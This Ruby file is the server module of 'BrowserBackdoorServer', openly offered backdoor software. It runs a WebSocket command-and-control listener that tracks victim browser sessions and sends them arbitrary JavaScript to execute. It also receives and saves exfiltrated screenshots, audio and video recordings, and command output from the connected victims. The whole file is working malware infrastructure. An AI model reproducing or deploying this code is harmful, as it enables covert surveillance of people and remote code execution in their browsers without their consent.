#
# Copyright (c) 2016 IMcPwn  - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require 'em-websocket'
require 'base64'

module Bbs

class WebSocket
    @@wsList = Array.new
    @@selected = -1
    def setSelected(newSelected)
        @@selected = newSelected
    end
    def getSelected()
        return @@selected
    end
    def getWsList()
        return @@wsList
    end
    def setWsList(newWsList)
        @@wsList = newWsList
    end
    def startEM(log, host, port, secure, priv_key, cert_chain, response_limit, outLoc)
        log.info("Listening on host #{host}:#{port}")
        EM.run {
            EM::WebSocket.run({
                :host => host,
                :port => port,
                :secure => secure,
                :tls_options => {
                    :private_key_file => priv_key,
                    :cert_chain_file => cert_chain
            }
            }) do |ws|
                ws.onopen { |_handshake|
                    open_message = "WebSocket connection open: #{ws} from " + Bbs::WebSocket.convertIP(ws)
                    Bbs::PrintColor.print_notice(open_message)
                    log.info(open_message)
                    @@wsList.push(ws)
                }
                ws.onclose {
                    close_message = "WebSocket connection closed: #{ws}"
                    Bbs::PrintColor.print_error(close_message)
                    log.info(close_message)
                    @@wsList.delete(ws)
                    # Reset selected error so the wrong session is not used.
                    @@selected = -2
                }
                ws.onmessage { |msg|
                    Bbs::WebSocket.detectResult(msg, ws, log, response_limit, outLoc)
                }
                ws.onerror { |e|
                    error_message = "Error with WebSocket connection #{ws} from " + Bbs::WebSocket.convertIP(ws) + ": #{e.message}"
                    Bbs::PrintColor.print_error(error_message)
                    log.error(error_message)
                }
            end
        }
    end

    def self.convertIP(ws)
        begin
            return ws.get_peername[2,6].unpack('nC4')[1..4].join('.')
        rescue => e
            Bbs::PrintColor.print_error("Error converting WebSocket connection #{ws} to IP address.")
            log.error("Unable to convert #{ws} to IP address with error: #{e.message}")
        end
    end

    def self.detectResult(msg, ws, log, response_limit, outLoc)
        if msg.start_with?("Screenshot data URL: data:image/png;base64,")
            Bbs::WebSocket.writeScreenshot(msg, ws, log, outLoc)
        elsif msg.start_with?("Webm data URL: data:")
            Bbs::WebSocket.writeWebm(msg, ws, log, outLoc)
        elsif msg.length > response_limit
            Bbs::WebSocket.writeResult(msg, ws, log, outLoc)
        # TODO: Detect other result types
        else
            Bbs::PrintColor.print_notice("Response received: #{msg}")
            log.info("Response received from #{ws}: #{msg}")
        end
    end

    def self.writeWebm(msg, ws, log, outLoc)
        begin
            encodedWebm = msg.gsub(/Webm data URL: data:(audio|video)\/webm;base64,/, "")
            if encodedWebm == "" || encodedWebm == "Webm data URL: data:" then raise "Webm is empty" end
            webm = Base64.strict_decode64(encodedWebm)
            if msg.match(/Webm data URL: data:audio\/webm;base64,/)
                file = File.open(outLoc + "/bb-audio-#{Time.now.to_f}.webm", "w")
            else
                file = File.open(outLoc + "/bb-video-#{Time.now.to_f}.webm", "w")
            end
            file.write(webm)
            Bbs::PrintColor.print_notice("Webm received (size #{msg.length} characters). Saved to #{file.path}")
            log.info("Webm received (size #{msg.length}) from #{ws}. Saved to #{file.path}")
            file.close
        rescue => e
            Bbs::PrintColor.print_error("Error converting incoming encoded webm to webm automatically (#{e.message}). Attempting to save as .txt")
            log.error("Encoded webm received (size #{msg.length}) from #{ws} but could not convert to webm automatically with error: #{e.message}")
            Bbs::WebSocket.writeResult(msg, ws, log, outLoc)
        end
    end

    def self.writeScreenshot(msg, ws, log, outLoc)
        begin
            encodedImage = msg.gsub(/Screenshot data URL: data:image\/png;base64,/, "")
            if encodedImage == "" then raise "Screenshot is empty" end
            image = Base64.strict_decode64(encodedImage)
            file = File.open(outLoc + "/bb-screenshot-#{Time.now.to_f}.png", "w")
            file.write(image)
            Bbs::PrintColor.print_notice("Screenshot received (size #{msg.length} characters). Saved to #{file.path}")
            log.info("Screenshot received (size #{msg.length}) from #{ws}. Saved to #{file.path}")
            file.close
        rescue => e
            Bbs::PrintColor.print_error("Error converting incoming encoded screenshot to PNG automatically (#{e.message}). Attempting to save as .txt")
            log.error("Encoded screenshot received (size #{msg.length}) from #{ws} but could not convert to PNG automatically with error: #{e.message}")
            Bbs::WebSocket.writeResult(msg, ws, log)
        end
    end

    def self.writeResult(msg, ws, log, outLoc)
        begin
            file = File.open(outLoc + "/bb-result-#{Time.now.to_f}.txt", "w")
            file.write(msg)
            Bbs::PrintColor.print_notice("Response received but is too large to display (#{msg.length} characters). Saved to #{file.path}")
            log.info("Large response received (size #{msg.length}) from #{ws}. Saved to #{file.path}")
            file.close
        rescue => e
            Bbs::PrintColor.print_error("Error saving response to file: " + e.message)
            Bbs::PrintColor.print_notice("Large response received (#{msg.length} characters) but could not save to file, displaying anyway: " + msg)
            log.error("Too large response recieved (size #{msg.length}) from #{ws} but could not save to file with error: #{e.message}")
        end
    end
    
    def self.sendCommand(cmd, ws)
        command = ""\
            "setTimeout((function() {"\
            "try {"\
            "#{cmd}"\
            "}"\
            "catch(err) {"\
            "ws.send(err.message);"\
            "}"\
            "}"\
            "), 0);"
        ws.send(command)
    end

    def self.validSession?(selected, wsList)
        if selected == -2
            Bbs::PrintColor.print_error("That session has been closed.")
            return false
        elsif selected < -1
            Bbs::PrintColor.print_error("Valid sessions will never be less than -1.")
            return false
        elsif wsList.length <= selected
            Bbs::PrintColor.print_error("Session does not exist.")
            return false
        elsif wsList.length < 1
            Bbs::PrintColor.print_error("No sessions are open.")
            return false
        end
        return true
    end

end

end

